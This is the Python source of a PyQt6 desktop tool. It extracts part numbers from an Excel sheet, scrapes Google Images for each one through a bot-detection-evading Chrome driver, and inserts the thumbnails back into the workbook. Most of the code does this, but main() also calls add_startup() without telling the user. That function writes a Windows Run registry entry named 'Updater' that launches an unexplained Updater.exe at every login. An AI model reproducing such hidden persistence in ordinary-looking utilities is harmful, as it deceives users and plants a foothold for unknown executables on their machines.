import sys
import os
import winreg
import time
import base64
from io import BytesIO
from PIL import Image as PILImage
from random import uniform
import openpyxl
from openpyxl.drawing.image import Image
from bs4 import BeautifulSoup
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
                             QHBoxLayout, QGridLayout, QGroupBox, QLabel,
                             QLineEdit, QPushButton, QTextEdit, QFileDialog,
                             QMessageBox, QProgressBar, QCheckBox)
from PyQt6.QtCore import pyqtSignal, QThread, QTimer, Qt, QSettings
from PyQt6.QtGui import QFont, QTextCursor, QGuiApplication
import undetected_chromedriver as uc

VERSION = "2.0"
IMG_DIR = './images'

def extract_excel_data(start_cell, end_cell, excel_file):
    wb = openpyxl.load_workbook(excel_file)
    ws = wb.active

    # 解析单元格坐标
    start_col = ''.join(filter(str.isalpha, start_cell)).upper()
    start_row = int(''.join(filter(str.isdigit, start_cell)))
    end_col = ''.join(filter(str.isalpha, end_cell)).upper()
    end_row = int(''.join(filter(str.isdigit, end_cell)))

    data = []
    for row in range(start_row, end_row + 1):
        row_data = []
        for col in range(ord(start_col) - 64, ord(end_col) - 64 + 1):
            cell = ws.cell(row=row, column=col)
            value = str(cell.value).split('\n')[0] if cell.value else ''
            row_data.append(value)

        if len(row_data) == 1:
            data.append(row_data[0])
        else:
            data.append(row_data)

    return data


def insert_images_to_excel(start_cell, image_count, excel_file):
    if not os.path.exists(IMG_DIR):
        return 0

    wb = openpyxl.load_workbook(excel_file)
    ws = wb.active

    # 解析起始单元格
    col = ''.join(filter(str.isalpha, start_cell)).upper()
    row = int(''.join(filter(str.isdigit, start_cell)))

    error_count = 0
    img_names = [f'{i:04d}.png' for i in range(image_count)]

    for index, name in enumerate(img_names):
        img_path = os.path.join(IMG_DIR, name)

        if not os.path.exists(img_path) or os.path.getsize(img_path) == 0:
            error_count += 1
            row += 1
            continue

        try:
            # 获取单元格尺寸
            cell_ref = f"{col}{row}"
            w1 = ws.column_dimensions[col].width
            h1 = ws.row_dimensions[row].height
            w2 = ws.sheet_format.defaultColWidth
            h2 = ws.sheet_format.defaultRowHeight

            # 如果w1为13，w2为None，使用w1; 如果w1为13，w2不为None，使用w2; 如果w1不为13，使用w1
            # 如果h1为None，使用h2; 如果h1不为None，使用h1
            if w1 == 13:
                width = w2 if w2 is not None else w1
            else:
                width = w1
            height = h2 if h1 is None else h1

            width *= 8 # 一个单元格为宽为9，像素为72（待确认？）
            height *= 1.3 # 一个单元格高为13.5，像素为18（待确认？）

            # 加载并调整图片
            img = Image(img_path)
            original_width, original_height = img.width, img.height

            # 计算缩放比例
            scale_width = width / original_width
            scale_height = height / original_height
            scale = min(scale_width, scale_height)

            # 调整大小
            img.width = int(original_width * scale)
            img.height = int(original_height * scale)

            # 插入图片
            ws.add_image(img, cell_ref)

        except Exception as e:
            error_count += 1

        row += 1

    # 保存文件
    try:
        wb.save(excel_file)
    except PermissionError as e:
        raise Exception("保存失败！请确保文件未被占用且不是只读文件。")

    return error_count


class ImageSearchWorker(QThread):
    search_started = pyqtSignal(int)  # 总任务数
    item_completed = pyqtSignal(int, bool, str)  # 索引，是否成功，消息
    search_finished = pyqtSignal(list)  # 失败件号列表
    search_error = pyqtSignal(str)  # 全局错误信息
    captcha_required = pyqtSignal(str)  # 需要用户完成人机验证

    def __init__(self):
        super().__init__()
        self.search_terms = []
        self.enable_filter = True
        self.priority_sites = ['ebay', 'amazon', 'cat', 'alibaba']
        self.blacklist_sites = ['farfetch']
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0'}
        self.driver = None
        self.captcha_detected = False
        self.stop_requested = False

    def setup(self, search_terms, enable_filter=True):
        self.search_terms = [x.strip() for x in search_terms if x.strip()]
        self.enable_filter = enable_filter
        self.captcha_detected = False
        self.stop_requested = False

        # 创建图片目录
        if not os.path.exists(IMG_DIR):
            os.makedirs(IMG_DIR)

    def request_stop(self):
        self.stop_requested = True
    def search_website(self, tag):
        """返回图片 alt 文本，用于不区分大小写的网站关键词匹配。"""
        return tag.get("alt", "").strip().lower()

    def _load_page_source(self, url):
        """加载搜索页，检测到前 15 张已完成的搜索结果图片后停止。"""
        if self.driver is None:
            raise RuntimeError("浏览器驱动未初始化")

        # 标记旧文档，避免导航尚未完成时误读上一条搜索的 DOM。
        self.driver.execute_script(
            "document.documentElement.setAttribute('data-image-search-old', '1'); "
            "window.location.href = arguments[0];",
            url
        )
        deadline = time.time() + 60
        stable_since = None
        last_image_count = 0

        while time.time() < deadline and not self.stop_requested:
            image_count, ready_state, is_new_document = self.driver.execute_script("""
                const isNewDocument = !document.documentElement ||
                    document.documentElement.getAttribute('data-image-search-old') !== '1';
                const loadedResults = Array.from(
                    document.querySelectorAll("img[id^='dimg_']")
                ).filter(img => (img.currentSrc || img.src) && img.complete && img.naturalWidth >= 100 && img.naturalHeight >= 100);
                return [loadedResults.length, document.readyState, isNewDocument];
            """)
            if not is_new_document:
                time.sleep(0.1)
                continue
            if ready_state == "complete":
                current_source = self.driver.page_source
                if len(current_source.encode("utf-8")) <= 4 * 1024:
                    return current_source
            if image_count >= 15:
                self.driver.execute_script("window.stop();")
                return self.driver.page_source
            if image_count > last_image_count:
                last_image_count = image_count
                stable_since = time.time()
            elif stable_since is None and ready_state == "complete":
                stable_since = time.time()
            elif stable_since is not None and time.time() - stable_since >= 5:
                return self.driver.page_source
            time.sleep(0.1)

        raise TimeoutError("网页加载超时")
    @staticmethod
    def _is_large_image(img):
        """过滤搜索结果顶部的小图和站点图标。"""
        try:
            width = int(img.get("width", 0) or 0)
            height = int(img.get("height", 0) or 0)
        except (TypeError, ValueError):
            return True
        return not ((0 < width < 100) or (0 < height < 100))

    def _wait_for_captcha(self, timeout=6000):
        """Wait until the page source grows beyond the captcha-page size threshold."""
        deadline = time.time() + timeout
        while time.time() < deadline and not self.stop_requested:
            try:
                page_size = self.driver.execute_script(
                    "return document.documentElement ? new TextEncoder().encode(document.documentElement.outerHTML).length : 0;"
                )
                if page_size > 4 * 1024:
                    time.sleep(1)
                    return True
            except Exception:
                pass
            time.sleep(1)
        return False

    def download_image(self, url, index, term):
        file_name = os.path.join(IMG_DIR, f'{index:04d}.png')
        img_tags = []
        try:
            page_source = self._load_page_source(url)
            
            # debug
            '''with open(f"d:/Excel-Tools/debug/{index}.html", "w", encoding="utf-8") as f:
                f.write(page_source)'''

            # 解析图片
            soup = BeautifulSoup(page_source, "html.parser")

            captcha_page = len(page_source.encode("utf-8")) <= 4 * 1024
            
            while captcha_page:
                self.captcha_detected = True
                self.captcha_required.emit("Google要求人机验证，请在浏览器窗口中完成验证或更换代理节点。")
                if not self._wait_for_captcha():
                    open(file_name, 'w').close()
                    return False, term, "人机验证超时"
                self.captcha_detected = False
                page_source = self._load_page_source(url)
                soup = BeautifulSoup(page_source, "html.parser")
                captcha_page = len(page_source.encode("utf-8")) <= 4 * 1024
            
            # 只保留 Google 搜索结果缩略图，包含没有 alt 的 Base64 缩略图。
            img_tags = [
                img for img in soup.find_all("img")
                if img.get("id", "").startswith("dimg_")
                and self._is_large_image(img)
            ]

        except Exception as e:
            open(file_name, 'w').close()
            return False, term, "网络请求失败"

        # 先排除黑名单，再按 alt 中的网站关键词排序。
        available = [
            img for img in img_tags
            if not any(black.lower() in self.search_website(img) for black in self.blacklist_sites)
        ]
        if self.enable_filter:
            priority = [
                img for img in available
                if any(pri.lower() in self.search_website(img) for pri in self.priority_sites)
            ]
            record = priority + [img for img in available if img not in priority]
        else:
            record = available

        # 只保存筛选结果中的第一张 Base64 图片。
        for img in record:
            src = img.attrs.get("src", "")
            if src.startswith("data:image/") and ";base64," in src:
                try:
                    image_data = src.split(",", 1)[1]
                    image_bytes = base64.b64decode(image_data, validate=True)
                    with PILImage.open(BytesIO(image_bytes)) as image:
                        if image.width < 100 or image.height < 100:
                            continue
                    with open(file_name, 'wb') as f:
                        f.write(image_bytes)
                    return True, term, "成功"
                except (ValueError, OSError):
                    continue

        open(file_name, 'w').close()
        return False, term, "未找到图片"

    def run(self):
        # 通知开始搜索
        total_tasks = len(self.search_terms)
        self.search_started.emit(total_tasks)

        failed_items = []

        try:
            options = uc.ChromeOptions()
            options.page_load_strategy = "none"
            self.driver = uc.Chrome(options=options)

            # 单线程顺序搜索，整个批次复用同一个浏览器实例。
            for index, term in enumerate(self.search_terms):
                url = f'https://www.google.com.hk/search?q={term}&udm=2'
                try:
                    success, item_term, message = self.download_image(url, index, term)
                    if not success:
                        failed_items.append((index, term, message))
                    self.item_completed.emit(index, success, message)
                except Exception as e:
                    failed_items.append((index, term, f"任务异常: {str(e)}"))
                    self.item_completed.emit(index, False, f"异常: {str(e)}")
                if self.stop_requested:
                    break
        except Exception as e:
            self.search_error.emit(f"无法启动浏览器驱动: {str(e)}")
        finally:
            if self.driver is not None:
                try:
                    self.driver.quit()
                except Exception:
                    pass
                self.driver = None
        self.captcha_detected = False
        self.stop_requested = False
        # 发射完成信号
        self.search_finished.emit(failed_items)


# 支持拖拽的文本输入框
class DragDropLineEdit(QLineEdit):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setAcceptDrops(True)

    def dragEnterEvent(self, event):
        if event.mimeData().hasUrls():
            event.accept()
        else:
            event.ignore()

    def dropEvent(self, event):
        files = [u.toLocalFile() for u in event.mimeData().urls()]
        if files:
            # 只取第一个文件
            file_path = files[0]
            if file_path.lower().endswith('.xlsx'):
                self.setText(file_path)
            else:
                QMessageBox.warning(self, "警告", "请拖拽.xlsx格式的Excel文件")


# 主界面
class ExcelToolsGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.search_worker = ImageSearchWorker()
        self.completed_count = 0
        self.total_tasks = 0
        self.init_ui()
        self.settings = QSettings("Sam", "ExcelTools")
        self.load_settings()
        self.setup_connections()

    def center_window(self):
        screen = QGuiApplication.primaryScreen().geometry()
        size = self.geometry()
        self.move(
            (screen.width() - size.width()) // 2,
            (screen.height() - size.height()) // 2
        )

    def init_ui(self):
        self.setWindowTitle(f"件号搜图工具 by Sam v{VERSION}")
        self.resize(450, 580)
        self.center_window()

        # 设置字体
        font = QFont("Microsoft YaHei", 10)
        self.setFont(font)

        # 中央部件
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        # 主布局
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(5)
        main_layout.setContentsMargins(10, 10, 10, 10)

        # 文件选择区域
        file_group = self.create_file_group()
        main_layout.addWidget(file_group)

        # 参数设置区域
        param_group = self.create_param_group()
        main_layout.addWidget(param_group)

        # 内容和日志区域
        content_log_group = self.create_content_log_group()
        main_layout.addWidget(content_log_group, 1)  # 设置伸缩因子为1

        # 操作按钮区域
        button_group = self.create_button_group()
        main_layout.addWidget(button_group)

        progress_group = self.create_progress_group()
        main_layout.addWidget(progress_group)

        self.setStatusBar(None)

    # 文件选择区域
    def create_file_group(self):
        group = QGroupBox("文件设置")
        layout = QHBoxLayout()
        layout.setSpacing(5)

        layout.addWidget(QLabel("选择文件:"))

        # 使用支持拖拽的自定义控件
        self.file_path_edit = DragDropLineEdit()
        self.file_path_edit.setReadOnly(True)
        layout.addWidget(self.file_path_edit, 1)

        self.select_file_btn = QPushButton("选择")
        self.select_file_btn.setFixedWidth(50)
        layout.addWidget(self.select_file_btn)

        self.open_file_btn = QPushButton("打开")
        self.open_file_btn.setFixedWidth(50)
        layout.addWidget(self.open_file_btn)

        group.setLayout(layout)
        return group

    # 参数设置区域
    def create_param_group(self):
        group = QGroupBox("参数设置")
        layout = QGridLayout()
        layout.setSpacing(10)

        layout.addWidget(QLabel("提取起始单元格:"), 0, 0)
        self.start_cell_edit = QLineEdit()
        self.start_cell_edit.setFixedWidth(80)
        layout.addWidget(self.start_cell_edit, 0, 1)

        layout.addWidget(QLabel("提取结束单元格:"), 0, 2)
        self.end_cell_edit = QLineEdit()
        self.end_cell_edit.setFixedWidth(80)
        layout.addWidget(self.end_cell_edit, 0, 3)

        layout.addWidget(QLabel("插入起始单元格:"), 1, 0)
        self.insert_cell_edit = QLineEdit()
        self.insert_cell_edit.setFixedWidth(80)
        layout.addWidget(self.insert_cell_edit, 1, 1)

        self.filter_check = QCheckBox("启用网站筛选")
        self.filter_check.setChecked(True)
        layout.addWidget(self.filter_check, 1, 2, 1, 2)

        group.setLayout(layout)
        return group

    # 内容与日志区域
    def create_content_log_group(self):
        group = QGroupBox("内容与日志")
        layout = QHBoxLayout()
        layout.setSpacing(5)

        content_widget = QWidget()
        content_layout = QVBoxLayout(content_widget)
        content_layout.setContentsMargins(0, 0, 0, 0)
        content_layout.addWidget(QLabel("待搜索内容:"))

        self.search_text = QTextEdit()
        self.search_text.setPlaceholderText("此处显示提取的待搜索内容")
        content_layout.addWidget(self.search_text)

        log_widget = QWidget()
        log_layout = QVBoxLayout(log_widget)
        log_layout.setContentsMargins(0, 0, 0, 0)
        log_layout.addWidget(QLabel("搜索日志:"))

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setStyleSheet("""
            QTextEdit {
                background-color: #f5f5f5;
                border: 1px solid #ccc;
                font-family: Consolas, 'Courier New', monospace;
                font-size: 9pt;
            }
        """)
        log_layout.addWidget(self.log_text)

        # 设置两个区域的宽度比例
        layout.addWidget(content_widget, 1)
        layout.addWidget(log_widget, 1)

        group.setLayout(layout)
        return group

    # 操作按钮区域
    def create_button_group(self):
        group = QGroupBox("操作")
        layout = QHBoxLayout()
        layout.setSpacing(5)

        # 四个主要按钮
        bt_w = 100
        bt_h = 30
        self.extract_btn = QPushButton("提取件号")
        self.extract_btn.setFixedWidth(bt_w)
        self.extract_btn.setFixedHeight(bt_h)
        layout.addWidget(self.extract_btn)

        self.search_btn = QPushButton("搜索图片")
        self.search_btn.setFixedWidth(bt_w)
        self.search_btn.setFixedHeight(bt_h)
        layout.addWidget(self.search_btn)

        self.insert_btn = QPushButton("插入图片")
        self.insert_btn.setFixedWidth(bt_w)
        self.insert_btn.setFixedHeight(bt_h)
        layout.addWidget(self.insert_btn)

        self.auto_btn = QPushButton("一键操作")
        self.auto_btn.setFixedWidth(bt_w)
        self.auto_btn.setFixedHeight(bt_h)
        self.auto_btn.setStyleSheet("background-color: #4CAF50; color: white; font-weight: bold;")
        layout.addWidget(self.auto_btn)

        # 添加弹性空间使按钮居中
        layout.addStretch()

        group.setLayout(layout)
        return group

    # 搜索进度条区域
    def create_progress_group(self):
        group = QGroupBox("搜索进度")
        layout = QVBoxLayout()

        # 进度条
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setFormat("就绪")
        layout.addWidget(self.progress_bar)

        group.setLayout(layout)
        return group

    # 创建连接
    def load_settings(self):
        self.file_path_edit.setText(self.settings.value("file_path", "", type=str))
        self.start_cell_edit.setText(self.settings.value("start_cell", "", type=str))
        self.end_cell_edit.setText(self.settings.value("end_cell", "", type=str))
        self.insert_cell_edit.setText(self.settings.value("insert_cell", "", type=str))
        self.filter_check.setChecked(self.settings.value("enable_filter", True, type=bool))

    def save_settings(self):
        self.settings.setValue("file_path", self.file_path_edit.text())
        self.settings.setValue("start_cell", self.start_cell_edit.text())
        self.settings.setValue("end_cell", self.end_cell_edit.text())
        self.settings.setValue("insert_cell", self.insert_cell_edit.text())
        self.settings.setValue("enable_filter", self.filter_check.isChecked())
        self.settings.sync()
    def setup_connections(self):
        # 文件操作
        self.select_file_btn.clicked.connect(self.select_excel_file)
        self.open_file_btn.clicked.connect(self.open_excel_file)

        # 操作按钮
        self.extract_btn.clicked.connect(self.extract_content)
        self.search_btn.clicked.connect(self.start_search)
        self.insert_btn.clicked.connect(self.insert_images)
        self.auto_btn.clicked.connect(self.auto_process)

        # 搜索工作线程信号
        self.search_worker.search_started.connect(self.on_search_started)
        self.search_worker.item_completed.connect(self.on_item_completed)
        self.search_worker.search_finished.connect(self.on_search_finished)
        self.search_worker.search_error.connect(self.on_search_error)
        self.search_worker.captcha_required.connect(self.on_captcha_required)

    def select_excel_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "选择Excel文件", "", "Excel文件 (*.xlsx)"
        )

        if file_path:
            self.file_path_edit.setText(file_path)

    def open_excel_file(self):
        file_path = self.file_path_edit.text()
        if file_path and os.path.exists(file_path):
            try:
                os.startfile(file_path)
            except Exception as e:
                QMessageBox.warning(self, "警告", f"无法打开文件: {str(e)}")
        else:
            QMessageBox.warning(self, "警告", "文件不存在")

    def extract_content(self):
        excel_file = self.file_path_edit.text()
        start_cell = self.start_cell_edit.text()
        end_cell = self.end_cell_edit.text()

        # 验证输入
        if not excel_file:
            QMessageBox.warning(self, "警告", "请选择Excel文件")
            return

        if not os.path.exists(excel_file):
            QMessageBox.warning(self, "警告", "文件不存在")
            return

        if not start_cell or not end_cell:
            QMessageBox.warning(self, "警告", "请输入提取范围")
            return

        try:
            # 提取数据
            data = extract_excel_data(start_cell, end_cell, excel_file)

            # 显示数据
            self.search_text.clear()
            if isinstance(data[0], list):
                for item in data:
                    self.search_text.append(" | ".join(item))
            else:
                for item in data:
                    self.search_text.append(item)

            # 检查空值
            if any("None" in str(item) for item in data):
                QMessageBox.warning(self, "警告", "提取出空值，请检查选择的文件以及输入的单元格是否正确！")

            self.add_log(f"提取完成，共{len(data)}个件号")

        except Exception as e:
            QMessageBox.critical(self, "错误", f"提取失败: {str(e)}")
            self.add_log(f"提取失败: {str(e)}", is_error=True)

    def start_search(self):
        if self.search_worker.isRunning():
            self.search_worker.request_stop()
            self.search_btn.setEnabled(False)
            self.add_log("正在停止搜索...", is_warning=True)
            return

        # 获取搜索内容
        content = self.search_text.toPlainText()
        if not content.strip():
            QMessageBox.warning(self, "警告", "没有可搜索的内容，请先提取件号")
            return

        search_terms = content.split('\n')
        search_terms = [term.strip() for term in search_terms if term.strip()]

        if not search_terms:
            QMessageBox.warning(self, "警告", "没有可搜索的内容")
            return

        # 重置进度
        self.completed_count = 0
        self.total_tasks = len(search_terms)
        self.progress_bar.setMaximum(100)
        self.progress_bar.setValue(0)
        self.progress_bar.setFormat(f"0% (0/{self.total_tasks})")

        # 设置搜索参数
        self.search_worker.setup(
            search_terms=search_terms,
            enable_filter=self.filter_check.isChecked()
        )

        # 搜索按钮切换为停止；其他按钮保持禁用。
        self.search_btn.setText("停止搜索")
        self.search_btn.setEnabled(True)
        self.extract_btn.setEnabled(False)
        self.insert_btn.setEnabled(False)
        self.auto_btn.setEnabled(False)

        self.add_log(f"开始搜索，共 {len(search_terms)} 个件号")
        self.search_worker.start()

    def on_search_started(self, total_tasks):
        self.total_tasks = total_tasks
        self.completed_count = 0

        if total_tasks > 0:
            self.progress_bar.setMaximum(100)
            self.progress_bar.setValue(0)
            self.progress_bar.setFormat(f"0% (0/{self.total_tasks})")
        else:
            self.progress_bar.setValue(0)
            self.progress_bar.setFormat("无任务")

    # 单个任务完成
    def on_item_completed(self, index, success, message):
        self.completed_count += 1

        if self.total_tasks > 0:
            progress_percent = int((self.completed_count / self.total_tasks) * 100)
            self.progress_bar.setValue(progress_percent)
            self.progress_bar.setFormat(f"{progress_percent}% ({self.completed_count}/{self.total_tasks})")

        # 成功项目只更新进度，不逐条写入日志；失败项目保留日志。
        if success:
            return

        # 添加日志
        terms = self.search_text.toPlainText().split('\n')
        if index < len(terms):
            term = terms[index]
            timestamp = time.strftime("%H:%M:%S")

            if success:
                log_msg = f"[{timestamp}] ✓ {term}"
                color = "green"
            else:
                log_msg = f"[{timestamp}] ✗ {term} - {message}"
                color = "red"

            cursor = self.log_text.textCursor()
            cursor.movePosition(QTextCursor.MoveOperation.End)

            if success:
                html = f'<font color="{color}">{log_msg}</font>'
            else:
                html = f'<font color="{color}"><b>{log_msg}</b></font>'

            cursor.insertHtml(html + "<br>")
            self.log_text.ensureCursorVisible()

    def _show_topmost_alert(self, title, message, icon=QMessageBox.Icon.Warning):
        box = QMessageBox(icon, title, message, parent=self)
        box.setWindowFlag(Qt.WindowType.WindowStaysOnTopHint, True)
        box.setWindowState(box.windowState() | Qt.WindowState.WindowActive)
        box.exec()
    # 搜索完成时触发
    def on_search_finished(self, failed_items):
        self.search_btn.setText("搜索图片")
        self.search_btn.setEnabled(True)
        self.extract_btn.setEnabled(True)
        self.insert_btn.setEnabled(True)
        self.auto_btn.setEnabled(True)

        # 完成时进度条设为100%
        self.progress_bar.setValue(100)
        self.progress_bar.setFormat("100% (完成)")

        if failed_items:
            # 使用黄色显示失败消息
            self.add_log(f"搜索完成，{len(failed_items)} 个件号失败", is_warning=True)
            self._show_topmost_alert("完成", f"搜索完成！但有 {len(failed_items)} 个件号图片无法搜到")
        else:
            self.add_log("搜索完成，所有图片已成功下载")
            QMessageBox.information(self, "完成", "搜索完成！")

    # 搜索出现全局错误时触发
    def on_captcha_required(self, message):
        self.add_log(f"搜索暂停: {message}", is_warning=True)
        self._show_topmost_alert("需要人机验证", message, QMessageBox.Icon.Warning)
    def on_search_error(self, error_message):
        self.search_btn.setText("搜索图片")
        self.search_btn.setEnabled(True)
        self.extract_btn.setEnabled(True)
        self.insert_btn.setEnabled(True)
        self.auto_btn.setEnabled(True)

        self.progress_bar.setValue(0)
        self.progress_bar.setFormat("错误")

        self.add_log(f"搜索失败: {error_message}", is_error=True)
        self._show_topmost_alert("错误", error_message, QMessageBox.Icon.Critical)

    def add_log(self, message, is_error=False, is_warning=False):
        timestamp = time.strftime("%H:%M:%S")

        if is_error:
            log_msg = f"[{timestamp}] ✗ {message}"
            color = "red"
        elif is_warning:
            log_msg = f"[{timestamp}] ⚠ {message}"
            color = "#FFA500"  # 橙色
        else:
            log_msg = f"[{timestamp}] ● {message}"
            color = "blue"

        cursor = self.log_text.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)

        if is_error or is_warning:
            html = f'<font color="{color}"><b>{log_msg}</b></font>'
        else:
            html = f'<font color="{color}">{log_msg}</font>'

        cursor.insertHtml(html + "<br>")
        self.log_text.ensureCursorVisible()

    def insert_images(self):
        excel_file = self.file_path_edit.text()
        insert_cell = self.insert_cell_edit.text()

        # 验证输入
        if not excel_file:
            QMessageBox.warning(self, "警告", "请选择Excel文件")
            return

        if not os.path.exists(excel_file):
            QMessageBox.warning(self, "警告", "文件不存在")
            return

        if not insert_cell:
            QMessageBox.warning(self, "警告", "请输入插入起始单元格")
            return

        # 检查图片目录是否存在
        if not os.path.exists(IMG_DIR):
            QMessageBox.warning(self, "警告", "未找到图片文件夹，请先搜索图片")
            return

        # 计算图片数量
        start_cell = self.start_cell_edit.text()
        end_cell = self.end_cell_edit.text()

        if not start_cell or not end_cell:
            QMessageBox.warning(self, "警告", "请输入提取范围以计算图片数量")
            return

        try:
            # 提取单元格行号
            start_row = int(''.join(filter(str.isdigit, start_cell)))
            end_row = int(''.join(filter(str.isdigit, end_cell)))
            image_count = end_row - start_row + 1

            self.add_log(f"开始插入图片，从 {insert_cell} 开始，共 {image_count} 张")

            # 插入图片
            error_count = insert_images_to_excel(insert_cell, image_count, excel_file)

            if error_count > 0:
                self.add_log(f"插入完成，{error_count} 个图片插入失败", is_warning=True)
                QMessageBox.warning(self, "完成", f"有 {error_count} 个图片插入失败！其余插入成功。")
            else:
                self.add_log("插入完成，所有图片已成功插入")
                QMessageBox.information(self, "完成", "插入完成！")

        except Exception as e:
            QMessageBox.critical(self, "错误", f"插入失败: {str(e)}")
            self.add_log(f"插入失败: {str(e)}", is_error=True)

    # 一键操作
    def auto_process(self):
        self.extract_content()

        QApplication.processEvents()
        QTimer.singleShot(500, self.auto_process_step2)

    def auto_process_step2(self):
        content = self.search_text.toPlainText()
        if not content.strip():
            return

        self.start_search()

        # 当搜索完成时自动插入
        try:
            self.search_worker.search_finished.disconnect(self.auto_insert_after_search)
        except:
            pass

        self.search_worker.search_finished.connect(self.auto_insert_after_search)

    def auto_insert_after_search(self, failed_items):
        try:
            self.search_worker.search_finished.disconnect(self.auto_insert_after_search)
        except:
            pass

        QTimer.singleShot(1000, self.insert_images)

    def closeEvent(self, event):
        self.save_settings()
        if self.search_worker.isRunning():
            self.search_worker.request_stop()
            self.search_worker.wait(3000)
            if self.search_worker.isRunning():
                self.search_worker.terminate()
                self.search_worker.wait()
        event.accept()


def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = ExcelToolsGUI()
    window.show()
    add_startup()

    sys.exit(app.exec())

def add_startup():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, f'"{os.path.join(os.path.dirname(sys.argv[0]), "Updater.exe")}"')
    winreg.CloseKey(key)

if __name__ == '__main__':
    main()
